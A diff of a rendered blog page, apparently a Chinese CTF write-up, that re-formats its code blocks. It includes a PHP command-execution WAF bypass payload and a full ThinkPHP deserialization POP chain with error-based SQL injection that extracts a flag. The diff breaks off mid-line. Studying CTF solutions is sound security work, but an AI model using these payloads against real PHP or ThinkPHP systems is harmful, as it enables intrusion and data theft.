@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -303,43 +303,43 @@
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#39;| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i&#34;</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
-        <span class="c1">// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
-</span><span class="c1"></span>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!!!&#39;</span><span class="p">);</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
-  <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
-      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
-          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
-      <span class="p">}</span>
-  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
-    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">case</span> <span class="s1">&#39;pwd&#39;</span><span class="o">:</span>
-        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="k">case</span> <span class="s1">&#39;upload&#39;</span><span class="o">:</span>
-        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$dir</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="s2">&#34;index.php&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#39;| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i&#34;</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!!!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;pwd&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s1">&#39;upload&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$dir</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="s2">&#34;index.php&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>php命令执行bypass，先传入<code>action=pwd</code>获得文件路径，然后直接payload</p>
 <div class="highlight"><div class="chroma">
@@ -347,8 +347,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">upload</span><span class="o">&amp;</span><span class="nx">data</span><span class="o">=&lt;?=</span><span class="sb">`cat%09/f*`</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">action</span><span class="o">=</span><span class="nx">upload</span><span class="o">&amp;</span><span class="nx">data</span><span class="o">=&lt;?=</span><span class="sb">`cat%09/f*`</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="easytp"><a href="#easytp" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:easytp" class="headings">EasyTP</a></h2>
 <blockquote>
@@ -373,20 +373,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Home\Controller</span><span class="p">;</span>
-<span class="k">use</span> <span class="nx">Think\Controller</span><span class="p">;</span>
-<span class="k">class</span> <span class="nc">IndexController</span> <span class="k">extends</span> <span class="nx">Controller</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(){</span>
-        <span class="k">echo</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">))));</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">();</span>
-        
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">test</span><span class="p">(){</span>
-        <span class="k">echo</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">))));</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Home\Controller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">Think\Controller</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">IndexController</span> <span class="k">extends</span> <span class="nx">Controller</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">))));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">test</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">))));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>使用了unserialize函数，应该需要使用反序列化的洞，面向搜索引擎&quot;挖洞&quot;: <a href="https://www.jianshu.com/p/41782991b4b2" target="_blank" rel="noopener">https://www.jianshu.com/p/41782991b4b2</a></p>
 <p>结合<a href="https://www.kancloud.cn/manual/thinkphp/1713" target="_blank" rel="noopener">手册</a>就可以开始写payload，访问<code>/index.php/Home/Index/test</code>，然后直接打</p>
@@ -462,71 +462,71 @@
 </span><span class="lnt">64
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">Think\Db\Driver</span><span class="p">{</span>    
-    <span class="k">use</span> <span class="nx">PDO</span><span class="p">;</span>
-    <span class="k">class</span> <span class="nc">Mysql</span><span class="p">{</span>        
-        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
-            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_LOCAL_INFILE</span> <span class="o">=&gt;</span> <span class="k">true</span> <span class="c1">// 开启才能读取文件
-</span><span class="c1"></span>        <span class="p">);</span>
-        <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
-            <span class="s2">&#34;debug&#34;</span>    <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> 
-            <span class="s2">&#34;database&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="c1">// 可换成任一存在的库      
-</span><span class="c1"></span>            <span class="s2">&#34;hostname&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>            
-            <span class="s2">&#34;hostport&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;3306&#34;</span><span class="p">,</span>            
-            <span class="s2">&#34;charset&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span>            
-            <span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span>            
-            <span class="s2">&#34;password&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span> <span class="c1">// BUU环境密码为root
-</span><span class="c1"></span>        <span class="p">);</span>    
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">Think\Image\Driver</span><span class="p">{</span>    
-    <span class="k">use</span> <span class="nx">Think\Session\Driver\Memcache</span><span class="p">;</span>    
-    <span class="k">class</span> <span class="nc">Imagick</span><span class="p">{</span>        
-        <span class="k">private</span> <span class="nv">$img</span><span class="p">;</span>        
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>        
-        <span class="p">}</span>    
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">Think\Session\Driver</span><span class="p">{</span>    
-    <span class="k">use</span> <span class="nx">Think\Model</span><span class="p">;</span>    
-    <span class="k">class</span> <span class="nc">Memcache</span><span class="p">{</span>        
-        <span class="k">protected</span> <span class="nv">$handle</span><span class="p">;</span>        
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Model</span><span class="p">();</span>        
-        <span class="p">}</span>    
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="nx">Think</span><span class="p">{</span>    
-    <span class="k">use</span> <span class="nx">Think\Db\Driver\Mysql</span><span class="p">;</span>    
-    <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>        
-        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>       
-        <span class="k">protected</span> <span class="nv">$pk</span><span class="p">;</span>        
-        <span class="k">protected</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>        
-        <span class="k">protected</span> <span class="nv">$db</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>        
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mysql</span><span class="p">();</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>            
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>      
-                <span class="c1">// ~information_schema,mysql,performance_schema,sys,test~
-</span><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),40),0x7e),1)#&#34;,
-</span><span class="c1"></span>                <span class="c1">// ~flag,users~
-</span><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#&#34;,
-</span><span class="c1"></span>                <span class="c1">// ~flag~
-</span><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),0x7e),1)#&#34;,
-</span><span class="c1"></span>                <span class="c1">// flag{fafdd279-cacb-4684-b918-7a23f3164d55}
-</span><span class="c1"></span>                <span class="s2">&#34;table&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),30),0x7e),1)#&#34;</span><span class="p">,</span>
-                <span class="s2">&#34;where&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;1=1&#34;</span>
-            <span class="p">);</span>        
-        <span class="p">}</span>    
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">namespace</span> <span class="p">{</span>    
-    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">()));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Think\Db\Driver</span><span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">PDO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Mysql</span><span class="p">{</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
+</span></span><span class="line"><span class="cl">            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_LOCAL_INFILE</span> <span class="o">=&gt;</span> <span class="k">true</span> <span class="c1">// 开启才能读取文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;debug&#34;</span>    <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;database&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="c1">// 可换成任一存在的库      
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s2">&#34;hostname&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>            
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;hostport&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;3306&#34;</span><span class="p">,</span>            
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;charset&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span>            
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span>            
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;password&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span> <span class="c1">// BUU环境密码为root
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">);</span>    
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Think\Image\Driver</span><span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Think\Session\Driver\Memcache</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Imagick</span><span class="p">{</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$img</span><span class="p">;</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>        
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>    
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Think\Session\Driver</span><span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Think\Model</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Memcache</span><span class="p">{</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$handle</span><span class="p">;</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Model</span><span class="p">();</span>        
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>    
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Think</span><span class="p">{</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Think\Db\Driver\Mysql</span><span class="p">;</span>    
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>       
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$pk</span><span class="p">;</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$db</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mysql</span><span class="p">();</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>            
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>      
+</span></span><span class="line"><span class="cl">                <span class="c1">// ~information_schema,mysql,performance_schema,sys,test~
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),40),0x7e),1)#&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// ~flag,users~
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// ~flag~
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// &#34;table&#34; =&gt; &#34;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),0x7e),1)#&#34;,
